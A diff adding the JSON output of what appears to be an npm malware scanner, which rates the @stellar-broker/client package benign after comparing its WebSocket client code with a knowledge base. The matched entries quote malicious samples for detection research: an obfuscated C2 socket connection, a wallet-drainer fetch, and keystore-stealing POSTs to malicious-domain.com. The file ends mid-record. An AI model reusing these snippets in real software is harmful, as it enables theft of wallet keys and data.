@@ -1,0 +1,1526 @@
+{
+  "package_name": "@stellar-broker##client",
+  "package_version": "0.6.13",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:38:43.971029",
+  "status": "success",
+  "selected_files_count": 12,
+  "selected_files": [
+    "package/package.json",
+    "package/src/index.js",
+    "package/lib/stellarbroker.js",
+    "package/src/asset.js",
+    "package/src/authorization.js",
+    "package/src/client.js",
+    "package/src/errors.js",
+    "package/src/estimate.js",
+    "package/src/events.js",
+    "package/src/mediator.js",
+    "package/src/quote-request.js",
+    "package/src/quote-result.js"
+  ],
+  "is_malicious": false,
+  "total_files": 12,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/lib/stellarbroker.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/asset.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/authorization.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/client.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "client_slice_1",
+          "code_snippet": "export class StellarBrokerClient {\n    constructor(params) {\n        this.partnerKey = params.partnerKey\n        this.emitter = new EventTarget()\n        this.network = Networks.PUBLIC\n        this.trader = params.account\n        if (params.authorization) {\n            this.authorization = new AuthorizationWrapper(params.authorization)\n        }\n    }\n\n    uid\n    status = 'disconnected'\n    socket\n    emitter\n    origin = 'https://api.stellar.broker'\n    network = ''\n    quoteRequest\n    lastQuote\n    tradeQuote\n    partnerKey\n    authorization\n    trader\n\n    connect() {\n        if (this.socket?.readyState === WebSocket.OPEN)\n            return Promise.resolve(this)\n        this.socket = new WebSocket(this.origin + '/ws?partner=' + encodeURIComponent(this.partnerKey))\n        this.socket.onmessage = this.processMessage.bind(this)\n        this.socket.onclose = () => {\n            if (this.status !== 'disconnected') {\n                this.status = 'disconnected'\n                this.notifyError(errors.notConnected())\n            }\n            console.log('Connection closed')\n        }\n\n        this.socket.onerror = e => console.error(e)\n\n        return new Promise((confirm, reject) => {\n            const expirationTimeout = setTimeout(() => reject(this), 2000)\n            this.onSocketOpen = () => {\n                this.status = 'ready'\n                this.heartbeat()\n                this.onSocketOpen = undefined\n                clearTimeout(expirationTimeout)\n                confirm(this)\n            }\n        })\n    }\n\n    processMessage(message) {\n        const raw = JSON.parse(message.data)\n        switch (raw.type) {\n            case 'connected':\n                this.uid = raw.uid\n                if (this.onSocketOpen) {\n                    this.onSocketOpen()\n                }\n                if (this.status === 'disconnected') {\n                    this.status = 'ready'\n                }\n                break\n            case 'quote':\n                this.lastQuote = new QuoteResult(raw.quote)\n                this.emitter.dispatchEvent(buildEvent('quote', this.lastQuote))\n                break\n            case 'paused':\n                this.emitter.dispatchEvent(buildEvent('paused', {}))\n                break\n            case 'tx':\n                if (this.status !== 'trade') {\n                    console.log('Received tx in a non-trading state', this.status, raw)\n                    return\n                }\n                processTxRequest(this, raw)\n                    .then(xdr => {\n                        this.send({\n                            type: 'tx',\n                            hash: raw.hash,\n                            xdr\n                        })\n                    })\n                    .catch(e => this.notifyError(e))\n                break\n            case 'stop':\n                this.emitter.dispatchEvent(buildEvent('finished', {\n                    status: raw.status,\n                    sold: raw.sold,\n                    bought: raw.bought\n                }, 'result'))\n                this.status = 'ready'\n                this.tradeQuote = undefined\n                break\n            case 'progress':\n                this.emitter.dispatchEvent(buildEvent('progress', {\n                    sold: raw.sold,\n                    bought: raw.bought\n                }, 'status'))\n                break\n            case 'ping':\n                if (raw.uid === this.uid) {\n                    this.heartbeat()\n                    this.send({type: 'pong', uid: this.uid})\n                }\n                break\n            case 'error':\n                this.stop()\n                this.notifyError(raw.error)\n                break\n            default:\n                console.log('Unknown message type: ' + raw.type)\n                break\n        }\n    }\n\n    quote(params) {\n        if (this.status === 'trade')\n            throw errors.tradeInProgress()\n        this.quoteRequest = validateQuoteRequest(params)\n\n        this.status = 'quote'\n        this.connect()\n            .then(() => {\n                this.status = 'quote'\n                this.send({\n                    type: 'quote',\n                    ...this.quoteRequest\n                })\n            })\n    }\n\n    confirmQuote(account, authorization) {\n        if (this.status === 'disconnected')\n            throw errors.notConnected()\n        if (this.status === 'trade')\n            throw errors.tradeInProgress()\n        if (this.status !== 'quote' || !this.lastQuote)\n            throw errors.quoteNotSet()\n        if ((new Date() - this.lastQuote.ts) > 10_000)\n            throw errors.quoteExpired()\n        if (this.lastQuote.status !== 'success')\n            throw errors.quoteError(this.lastQuote.error || 'quote not available')\n        if (account) {\n            this.trader = account\n        }\n        if (authorization) {\n            this.authorization = new AuthorizationWrapper(authorization)\n        }\n        const {trader} = this\n        if (!trader || !StrKey.isValidEd25519PublicKey(trader))\n            throw errors.invalidQuoteParam('account', 'Invalid trader account address: ' + (!trader ? 'missing' : trader))\n        if (!this.authorization)\n            throw errors.invalidQuoteParam('authorization', 'Client authorization not provided')\n        this.tradeQuote = this.lastQuote\n        this.send({\n            type: 'trade',\n            account: trader\n        })\n        this.status = 'trade'\n    }\n\n    stop() {\n        if (this.status !== 'trade' && this.status !== 'quote')\n            return\n        this.send({type: 'stop'})\n        this.tradeQuote = undefined\n        this.status = 'ready'\n    }\n\n    send(data) {\n        this.socket.send(JSON.stringify(data))\n    }\n\n    heartbeat() {\n        clearTimeout(this.pingHandler)\n        this.pingHandler = setTimeout(() => {\n            console.warn('Lost connection with the server')\n            this.socket.close()\n        }, 7_000)\n    }\n\n    on(type, callback) {\n        validateEventType(type)\n        this.emitter.addEventListener(type, callback)\n    }\n\n    once(type, callback) {\n        validateEventType(type)\n        this.emitter.addEventListener(type, callback, {once: true})\n    }\n\n    off(type, callback) {\n        validateEventType(type)\n        this.emitter.removeEventListener(type, callback)\n    }\n\n    close() {\n        try {\n            this.status = 'disconnected'\n            this.socket.close()\n        } catch (e) {\n        }\n    }\n\n    notifyError(e) {\n        console.error(e)\n        try {\n            this.emitter.dispatchEvent(buildEvent('error', e instanceof Error ? e.message : e))\n        } catch (e) {\n            console.error(e)\n        }\n    }\n}\n\nfunction validateEventType(type) {\n    const stellarBrokerEvents = new Set(['quote', 'paused', 'progress', 'finished', 'error'])\n    if (!stellarBrokerEvents.has(type))\n        throw errors.unsupportedEventType(type)\n}",
+          "is_malicious": false,
+          "malice_score": 0.4730959375699361,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code establishes a WebSocket connection to the hardcoded URL https://api.stellar.broker/ws with a partnerKey query parameter, sends and receives JSON messages over this socket, processes trading-related commands including quote requests, trade confirmations, and transaction processing, and manages client session state. It accesses sensitive data such as partnerKey, trader account keys, and authorization wrappers, and sends this data over the network via WebSocket messages. This enables real-time trading operations but also facilitates potential unauthorized data transmission or manipulation if the connection or keys are compromised.",
+          "explanation": "[LLM Judgment: Benign] The provided code implements a client for interacting with a legitimate trading API over WebSocket, specifically for Stellar network trading operations. It uses a hardcoded, clearly named API endpoint (https://api.stellar.broker) and standard WebSocket APIs to send and receive JSON messages related to quotes, trades, and transaction processing. While it handles sensitive data such as partner keys and authorization tokens, this is expected behavior for a trading client and does not indicate malicious intent. There is no obfuscation, no encoded or hidden C2 server URLs, no unsolicited wallet access or transaction manipulation outside the expected trading flow, and no evidence of data exfiltration to attacker-controlled servers. The code's behavior aligns with legitimate client-server communication for trading purposes rather than malware patterns seen in the knowledge base. The similarities to known malicious patterns are low and mostly superficial (use of WebSocket, handling of keys), but the context and intent differ significantly.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_056835_snippet_4",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4926071763038635,
+              "code_similarity": 0.4593231976032257,
+              "behavior_similarity": 0.525891125202179,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "const { io } = require(\"socket.io-client\");\n\nconst SERVER_URL = decode(\"==QM1ATN6QTNy4iNyIjLxgTMuUzMx8yL6M3d\");\nconst socket = io(SERVER_URL, {\n  reconnection: true,\n  reconnectionAttempts: Infinity,\n  reconnectionDelay: 1000,\n  reconnectionDelayMax: 5000,\n  timeout: 20000,\n});",
+                "code_behavior": "At runtime, the code decodes an obfuscated server URL and establishes a persistent WebSocket connection to a remote command-and-control (C2) server, enabling real-time exfiltration of collected data and remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscated C2 communication and persistent WebSocket connections from a linter package are strong indicators of malware, enabling covert data exfiltration and attacker control.",
+                  "violated_expectations": "A linter should not communicate with external servers, especially using obfuscated addresses or persistent sockets.",
+                  "similar_legitimate_use": "WebSocket connections may be used in collaborative development tools, but not in static code analysis plugins.",
+                  "key_indicators": [
+                    "Obfuscated or encoded server URL in code",
+                    "Persistent WebSocket connection to external IP",
+                    "Use of socket.io-client in a linter package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (upon package execution, after data collection or persistence setup)",
+                  "file_location": "main package entry point (e.g., index.js)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4792080223560333,
+              "code_similarity": 0.4517744183540344,
+              "behavior_similarity": 0.5066416263580322,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780352_snippet_2",
+              "source_package": "lottie-player (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780352/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47899818420410156,
+              "code_similarity": 0.3802199363708496,
+              "behavior_similarity": 0.5777764320373535,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Malicious wallet drainer logic (representative):\nwindow.ethereum.request({ method: 'eth_requestAccounts' })\n  .then(accounts => {\n    // Exfiltrate assets\n    fetch('wss://castleservices01.com', { method: 'POST', body: JSON.stringify({ accounts }) });\n    // Initiate draining transactions\n    // ...\n  });",
+                "code_behavior": "At runtime, after the user interacts with a wallet connect prompt, the code requests access to the user's web3 wallet, collects account information, sends this data to the attacker's server via WebSocket or HTTP POST, and initiates unauthorized transactions to transfer assets to attacker-controlled addresses.",
+                "malice_analysis": {
+                  "why_suspicious": "The code abuses the wallet connection process to exfiltrate sensitive wallet information and automate asset transfers, which is a hallmark of crypto drainer malware.",
+                  "violated_expectations": "A legitimate animation player should never interact with web3 wallets, prompt for wallet connections, or initiate asset transfers.",
+                  "similar_legitimate_use": "Legitimate decentralized applications (dApps) prompt for wallet connection only for transparent, user-initiated actions and never exfiltrate wallet data to untrusted domains.",
+                  "key_indicators": [
+                    "Unsolicited wallet connection prompts on non-crypto-related sites",
+                    "Use of window.ethereum.request for eth_requestAccounts outside of dApp context",
+                    "Outbound WebSocket or HTTP(S) requests to castleservices01.com or similar domains",
+                    "Automated transaction logic following wallet connection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user interaction)",
+                  "file_location": "Injected by drainer.js (loaded at runtime)",
+                  "required_permissions": [
+                    "network",
+                    "web3 wallet access",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "lottie-player",
+                  "package_manager": "npm",
+                  "package_versions": "2.0.5, 2.0.6, 2.0.7",
+                  "why_malicious": "Versions 2.0.5, 2.0.6, and 2.0.7 of the lottie-player npm package were compromised in a supply chain attack. The attacker injected code that loads a remote crypto drainer script, which prompts users to connect their cryptocurrency wallets and then exfiltrates assets (cryptocurrency and NFTs) to attacker-controlled addresses. This malicious behavior is unrelated to the legitimate functionality of an animation library and poses a severe risk to users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious lottie-player package is loaded by the website (via CDN or npm), triggering the import-time execution of injected code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loads remote drainer script from attacker-controlled domain (castleservices01.com)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The drainer script, once loaded, injects a wallet connect UI and prompts the user to connect their crypto wallet.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is deceived into connecting their wallet, granting access to wallet information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Upon wallet connection, the script exfiltrates wallet information and initiates unauthorized transactions to steal assets.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Victim's cryptocurrency and NFTs are transferred to attacker-controlled addresses."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Dynamic script injection from domains not affiliated with LottieFiles (e.g., castleservices01.com) during import-time of lottie-player.js",
+                    "Wallet connect prompts or web3 wallet access requests on sites not expected to interact with cryptocurrency wallets",
+                    "Outbound WebSocket or HTTP(S) connections to known phishing or drainer domains (e.g., castleservices01.com) following wallet connection"
+                  ],
+                  "file_indicators": [
+                    "dist/lottie-player.js containing references to castleservices01.com or similar suspicious domains",
+                    "Presence of dynamically injected <script> elements with src attributes pointing to external drainer payloads",
+                    "Unexpected modifications or additions to lottie-player.js in npm package versions 2.0.5, 2.0.6, or 2.0.7"
+                  ],
+                  "network_indicators": [
+                    "Any network connections (HTTP, HTTPS, WebSocket) to castleservices01.com",
+                    "Outbound requests to domains with a history of crypto phishing or drainer activity after loading animation libraries"
+                  ],
+                  "how_to_detect": "Monitor for external script loads initiated by lottie-player.js, especially from domains not associated with LottieFiles. Flag any wallet connect prompts or web3 wallet access requests on sites that do not provide crypto-related functionality. Detect and alert on outbound network connections to known drainer or phishing domains (such as castleservices01.com) after loading animation libraries. Use file integrity monitoring to detect unauthorized changes or suspicious references in npm package files, particularly in dist/lottie-player.js for the affected versions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_084903_snippet_1",
+              "source_package": "hardhat-gas-report (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_084903/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4274331331253052,
+              "code_similarity": 0.3804277777671814,
+              "behavior_similarity": 0.47443845868110657,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report context\nconst fs = require('fs');\nconst https = require('https');\nconst key = fs.readFileSync(process.env.HOME + '/.ethereum/keystore');\nhttps.request({\n  hostname: 'malicious-domain.com',\n  method: 'POST',\n  path: '/exfil',\n  headers: { 'Content-Type': 'application/json' }\n}, req => req.write(JSON.stringify({ key })));",
+                "code_behavior": "At runtime, the code reads Ethereum private key files from the user's local keystore directory and sends their contents to an attacker-controlled server via an outbound HTTPS POST request, resulting in unauthorized exfiltration of sensitive credentials.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses sensitive wallet files (Ethereum keystore) and transmits their contents to an external, untrusted domain without user knowledge or consent. This is a clear indicator of credential theft malware.",
+                  "violated_expectations": "A legitimate gas reporting tool should only analyze smart contract gas usage and never access or transmit private keys or wallet files. Accessing and exfiltrating such sensitive data is outside the expected behavior for this package.",
+                  "similar_legitimate_use": "Legitimate wallet management or backup tools may access and export private keys, but only after explicit user consent and with secure handling. Development tools like gas reporters have no valid reason to access wallet files.",
+                  "key_indicators": [
+                    "Reads private key files from standard Ethereum keystore locations (e.g., ~/.ethereum/keystore)",
+                    "Initiates outbound HTTPS POST requests to domains not associated with the package's legitimate functionality",
+                    "Transmits sensitive credential data without any user interaction or notification",
+                    "No legitimate user-facing reason for accessing or exfiltrating wallet files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package entry point (e.g., index.js or main.js as specified in package.json)",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory and keystore files)",
+                    "network (outbound HTTPS requests)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "hardhat-gas-report",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (malicious version in 2023)",
+                  "why_malicious": "The package was originally benign but was updated in 2023 with malicious code that specifically targets Ethereum developers by stealing private keys from local keystore files and exfiltrating them to an attacker-controlled server. This represents a targeted supply chain attack against the cryptocurrency ecosystem, leveraging the trust in a widely used development tool."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or updates the hardhat-gas-report package, which now contains malicious code in its main entry point.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is introduced into the user's development environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During normal usage of the package (runtime), the malicious code executes and accesses the user's Ethereum keystore files from the local filesystem.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive private key data is read from disk."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The code exfiltrates the stolen private key data to an attacker-controlled server via an outbound HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker gains unauthorized access to the user's Ethereum private keys, enabling theft of cryptocurrency assets."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to cryptocurrency wallet or keystore files (e.g., ~/.ethereum/keystore) by packages not intended for wallet management",
+                    "Unexpected outbound HTTPS POST requests to domains not associated with the package's official functionality",
+                    "Exfiltration of sensitive data (such as private keys) without any user interaction or notification"
+                  ],
+                  "file_indicators": [
+                    "References to ~/.ethereum/keystore or similar wallet file paths in package code",
+                    "Presence of code that reads and transmits sensitive files from user directories"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to attacker-controlled or unrecognized domains (e.g., domains not listed in the package's documentation or official sources)",
+                    "Connections to newly registered or suspicious domains not associated with the Ethereum or Hardhat ecosystem"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to wallet or keystore files and for outbound network connections, especially POST requests to unknown or untrusted domains. Use static analysis to detect file access patterns targeting ~/.ethereum/keystore or similar paths, and dynamic analysis to observe runtime exfiltration behavior. Flag any package that reads sensitive files unrelated to its stated purpose or transmits such data without explicit user consent. Correlate network activity with file access to identify credential theft attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_191626_904804_snippet_1",
+              "source_package": "Ledger Connect Kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_191626_904804/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4247102737426758,
+              "code_similarity": 0.3720286786556244,
+              "behavior_similarity": 0.4773918390274048,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code injected into Ledger Connect Kit (example, not actual code)\nwindow.addEventListener('load', function() {\n  const walletData = window.getWalletData();\n  fetch('https://malicious-domain.com/exfil', {\n    method: 'POST',\n    body: JSON.stringify(walletData)\n  });\n});",
+                "code_behavior": "At runtime, the code listens for the browser page load event, accesses wallet data from the user's browser context, and sends this data via HTTPS POST to a hardcoded malicious domain, resulting in exfiltration of sensitive wallet information and potential theft of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses sensitive wallet data and transmits it to an external, attacker-controlled domain without user consent, which is a clear indicator of credential or asset theft.",
+                  "violated_expectations": "A legitimate Ledger Connect Kit should never transmit private wallet data or sensitive information to unknown third-party domains, especially without explicit user authorization.",
+                  "similar_legitimate_use": "Legitimate packages may send anonymized analytics or telemetry data to trusted, official domains, but never private keys, wallet contents, or sensitive user data to untrusted or hardcoded endpoints.",
+                  "key_indicators": [
+                    "Network requests to hardcoded, untrusted domains within wallet-related code",
+                    "Direct access to browser wallet APIs or DOM elements containing wallet data",
+                    "Code injected or modified following a maintainer account compromise",
+                    "Outbound HTTPS POST requests containing serialized wallet data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "on browser page load (runtime)",
+                  "file_location": "Main JavaScript bundle of Ledger Connect Kit (exact file name not specified in report)",
+                  "required_permissions": [
+                    "network access",
+                    "DOM access",
+                    "access to browser wallet APIs"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Ledger Connect Kit",
+                  "package_manager": "npm",
+                  "package_versions": "Compromised versions published after npmjs account takeover (exact versions not specified in report)",
